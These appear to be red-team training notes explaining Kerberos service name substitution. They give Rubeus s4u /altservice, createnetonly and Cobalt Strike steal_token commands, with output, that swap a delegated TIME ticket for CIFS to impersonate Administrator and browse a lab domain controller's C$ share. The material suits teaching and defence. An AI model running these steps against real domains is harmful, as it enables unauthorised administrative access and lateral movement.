
Service Name Substitution is a technique that allows an adversary to "swap" a service ticket for one service, to another service.  That sounds a bit weird, so let's explain more fully...

Both the AS-REP and TGS-REP messages share the same data structure, called **KDC-REP**.  The content of the `ticket[5]` and `enc-part[6]` fields obviously depends on the type of reply being sent.  In the case of a TGS-REP, this would be a service ticket and an **EncTGSRepPart**.

![[Pasted image 20250722091407.png]]

The **Ticket** structure also has an encrypted part that contains data such as the principal the ticket was issued to, and a copy of the service session key.  However, notice that the SPN (the `sname[2]` field) is _not_ encrypted.

![[Pasted image 20250722091533.png]]

This means that if an adversary obtains a service ticket for say, HTTP/PC1, they can overwrite this field with another SPN, such as CIFS/PC1.  The ticket is still valid because the sname field is also not included in the ticket's checksum calculation.

>This only works if the substituted SPN is running as the same account as the original service; i.e. you cannot swap HTTP/PC1 for something like CIFS/PC2.

This technique works because when both services are running under the context of the same account, the session keys within the tickets are encrypted using the same key.  The substituted service will therefore have no problem decrypting the ticket, even though the KDC didn't explicitly return a TGS-REP for that SPN.

This abuse is particularly useful in cases of constrained delegation, where the service being delegated to is not immediately useful for lateral movement.  For example, here we see that _lon-ws-1_ can delegate to the TIME service on _lon-dc-1_.

```powershell
sAMAccountName: LON-WS-1$
msDS-AllowedToDelegateTo: time/lon-dc-1.contoso.com, time/lon-dc-1
```

The issue for an adversary is that TIME is not useful like CIFS, in that it doesn't grant remote access to the computer.  But using this technique, we can request a service ticket for TIME and just replace the service name in the returned ticket from TIME to CIFS, or anything else that we want.  This is made possible in Rubeus via the `/altservice` parameter.

>The following procedure assumes that protocol transition is enabled.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap
```

Where:  

- `/user` is the principal (e.g. computer) configured for the delegation.
    
- `/msdsspn` is the service that the principal is allowed to delegate to.
    
- `/altservice` is the service to substitute into the final ticket.
    
- `/ticket` is the TGT for the principal.
    
- `/impersonateuser` is the user we want to impersonate.

> The `altservice` parameter actually takes a comma-separated list of services, e.g. `/altservice:cifs,host,http`.  This will produce 3 new tickets that you can inject.

```powershell
[*] Action: S4U

[*] Building S4U2self request for: 'LON-WS-1$@CONTOSO.COM'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2self request to 10.10.120.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WS-1$@CONTOSO.COM'
[*] base64(ticket.kirbi):

      doIF8[...snip...]MtMSQ=

[*] Impersonating user 'Administrator' to target SPN 'time/lon-dc-1'
[*]   Final ticket will be for the alternate service 'cifs'
[*] Building S4U2proxy request for service: 'time/lon-dc-1'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/lon-dc-1':

      doIGf[...snip...]RjLTE=
```

![[Pasted image 20250722091700.png]]

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGf[...snip...]RjLTE=

[*] Using CONTOSO.COM\Administrator:FakePass

[*] Showing process : False
[*] Username        : Administrator
[*] Domain          : CONTOSO.COM
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2548
[+] Ticket successfully imported!
[+] LUID            : 0x9bb752

beacon> steal_token 2548
beacon> ls \\lon-dc-1\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 08:20:24   PerfLogs
          dir     01/23/2025 15:46:17   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     01/24/2025 14:08:45   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/29/2025 10:42:20   System Volume Information
          dir     01/24/2025 13:33:21   Users
          dir     01/24/2025 13:49:56   Windows
 12kb     fil     02/21/2025 01:45:32   DumpStack.log.tmp
 1gb      fil     02/21/2025 01:45:32   pagefile.sys
```